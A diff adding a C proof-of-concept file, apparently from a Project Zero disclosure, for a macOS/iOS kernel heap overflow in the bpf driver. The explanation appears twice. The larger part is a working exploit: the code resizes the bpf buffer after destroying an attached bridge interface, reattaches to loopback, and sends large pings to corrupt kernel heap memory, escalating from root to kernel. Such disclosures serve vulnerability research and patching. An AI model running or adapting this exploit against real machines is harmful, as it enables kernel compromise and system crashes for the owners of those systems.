@@ -1,0 +1,166 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1125
+
+The bpf ioctl BIOCSBLEN allows userspace to set the bpf buffer length:
+
+  case BIOCSBLEN:     /* u_int */
+    if (d->bd_bif != 0)
+      error = EINVAL;
+    else {
+      u_int size;
+
+      bcopy(addr, &size, sizeof (size));
+
+      if (size > bpf_maxbufsize)
+        size = bpf_maxbufsize;
+      else if (size < BPF_MINBUFSIZE)
+        size = BPF_MINBUFSIZE;
+      bcopy(&size, addr, sizeof (size));
+      d->bd_bufsize = size;
+    }
+    break;
+
+
+d->bd_bif is set to the currently attached interface, so we can't change the length if we're already
+attached to an interface.
+
+There's no ioctl command to detach us from an interface, but we can just destroy the interface
+(by for example attaching to a bridge interface.) We can then call BIOCSBLEN again with a larger
+length which will set d->bd_bufsize to a new, larger value.
+
+If we then attach to an interface again we hit this code in bpf_setif:
+
+    if (d->bd_sbuf == 0) {
+      error = bpf_allocbufs(d);
+      if (error != 0)
+        return (error);
+
+This means that the buffers actually won't be reallocated since d->bd_sbuf will still point to the
+old buffer. This means that d->bd_bufsize is out of sync with the actual allocated buffer size
+leading to heap corruption when packets are receive on the target interface.
+
+This PoC sets a small buffer length then creates and attaches to a bridge interface. It then destroys
+the bridge interface (which causes bpfdetach to be called on that interface, clearing d->bd_bif for our
+bpf device.)
+
+We then set a large buffer size and attach to the loopback interface and sent some large ping packets.
+
+This bug is a root -> kernel priv esc
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+*/
+
+//ianbeer
+#if 0
+MacOS/iOS kernel heap overflow in bpf
+
+The bpf ioctl BIOCSBLEN allows userspace to set the bpf buffer length:
+
+	case BIOCSBLEN:			/* u_int */
+		if (d->bd_bif != 0)
+			error = EINVAL;
+		else {
+			u_int size;
+
+			bcopy(addr, &size, sizeof (size));
+
+			if (size > bpf_maxbufsize)
+				size = bpf_maxbufsize;
+			else if (size < BPF_MINBUFSIZE)
+				size = BPF_MINBUFSIZE;
+			bcopy(&size, addr, sizeof (size));
+			d->bd_bufsize = size;
+		}
+		break;
+
+
+d->bd_bif is set to the currently attached interface, so we can't change the length if we're already
+attached to an interface.
+
+There's no ioctl command to detach us from an interface, but we can just destroy the interface
+(by for example attaching to a bridge interface.) We can then call BIOCSBLEN again with a larger
+length which will set d->bd_bufsize to a new, larger value.
+
+If we then attach to an interface again we hit this code in bpf_setif:
+
+		if (d->bd_sbuf == 0) {
+			error = bpf_allocbufs(d);
+			if (error != 0)
+				return (error);
+
+This means that the buffers actually won't be reallocated since d->bd_sbuf will still point to the
+old buffer. This means that d->bd_bufsize is out of sync with the actual allocated buffer size
+leading to heap corruption when packets are receive on the target interface.
+
+This PoC sets a small buffer length then creates and attaches to a bridge interface. It then destroys
+the bridge interface (which causes bpfdetach to be called on that interface, clearing d->bd_bif for our
+bpf device.)
+
+We then set a large buffer size and attach to the loopback interface and sent some large ping packets.
+
+This bug is a root -> kernel priv esc
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <net/bpf.h>
+#include <net/if.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+
+int main(int argc, char** argv) {
+  int fd = open("/dev/bpf3", O_RDWR);
+  if (fd == -1) {
+    perror("failed to open bpf device\n");
+    exit(EXIT_FAILURE);
+  }
+
+  // first set a small length:
+  int len = 64;
+  int err = ioctl(fd, BIOCSBLEN, &len);
+  if (err == -1) {
+    perror("setting small buffer length");
+    exit(EXIT_FAILURE);
+  }
+
+  // create an interface which we can destroy later:
+  system("ifconfig bridge7 create");
+
+  // connect the bpf device to that interface, allocating the buffer
+  struct ifreq ifr;
+  strcpy(ifr.ifr_name, "bridge7");
+  err = ioctl(fd, BIOCSETIF, &ifr);
+  if (err == -1) {
+    perror("attaching to interface");
+    exit(EXIT_FAILURE);
+  }
+
+  // remove that interface, detaching us:
+  system("ifconfig bridge7 destroy");
+
+  // set a large buffer size:
+  len = 4096;
+  err = ioctl(fd, BIOCSBLEN, &len);
+  if (err == -1) {
+    perror("setting large buffer length");
+    exit(EXIT_FAILURE);
+  }
+
+  // connect to a legit interface with traffic:
+  strcpy(ifr.ifr_name, "lo0");
+  err = ioctl(fd, BIOCSETIF, &ifr);
+  if (err == -1) {
+    perror("attaching to interface");
+    exit(EXIT_FAILURE);
+  }
+
+  // wait for a packet...
+  system("ping localhost -s 1400");
+  
+  return 0;
+}
